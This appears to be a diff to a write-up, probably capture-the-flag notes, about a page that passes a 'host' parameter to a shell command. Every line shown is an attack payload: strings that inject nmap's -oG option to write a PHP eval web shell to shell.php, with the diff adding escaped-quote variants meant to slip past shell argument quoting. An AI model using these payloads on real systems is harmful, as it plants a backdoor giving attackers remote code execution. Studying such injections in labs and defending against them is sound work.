@@ -369,5 +369,9 @@ if(!isset($_GET['host'])) {
 ```php
 ' <?=eval($_POST[1]);?> -oG shell.php '
 
-'         <?=eval($_POST[1]);?> -oG shell.php     '
+
+'\'   <?=eval($_POST[1]);?> -oG shell.php \''
+
+
+'\\'   <?=eval($_POST[1]);?> -oG shell.php \\''
 ```
